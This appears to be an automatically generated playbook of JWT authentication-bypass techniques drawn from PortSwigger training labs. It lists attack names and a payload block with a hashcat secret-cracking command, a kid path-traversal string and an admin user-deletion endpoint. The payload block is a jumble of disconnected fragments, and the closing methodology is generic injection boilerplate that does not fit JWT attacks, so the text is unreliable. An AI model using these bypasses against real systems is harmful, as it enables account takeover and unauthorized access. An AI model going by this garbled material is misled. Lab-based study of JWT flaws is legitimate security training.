## JWT Playbook
*Synthesized from 8 PortSwigger labs*

### Overview
This playbook covers 8 known attack techniques for jwt.

### Attack Techniques

**Bypass Techniques:**
- JWT authentication bypass via algorithm confusion
- JWT authentication bypass via algorithm confusion with no exposed key
- JWT authentication bypass via flawed signature verification
- JWT authentication bypass via jku header injection
- JWT authentication bypass via jwk header injection
- JWT authentication bypass via kid header path traversal
- JWT authentication bypass via unverified signature
- JWT authentication bypass via weak signing key

### Key Payloads
```
jwt_forgery.py
/dev/null
hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
GET /admin
JSON Web Token
/jwks.json
keys
HS256
docker run --rm -it portswigger/sig2n <token1> <token2>
/admin
/admin/delete?username=[TARGET_USER]
/login
../../../../../../../dev/null
{
    "keys": [

    ]
}
--show
administrator
/my-account
secret1
Sign
none
```

### Indicators of Success
- Unexpected data in response
- Error messages revealing internal info
- Behavior change confirming injection
- Out-of-band callback received
- Access to unauthorized resources

### Testing Methodology
1. **Identify injection points** — forms, parameters, headers, cookies
2. **Test basic payloads** — start simple, escalate complexity
3. **Observe responses** — errors, timing, content changes
4. **Try bypasses** — encoding, alternative syntax, filter evasion
5. **Confirm impact** — data extraction, privilege escalation, RCE

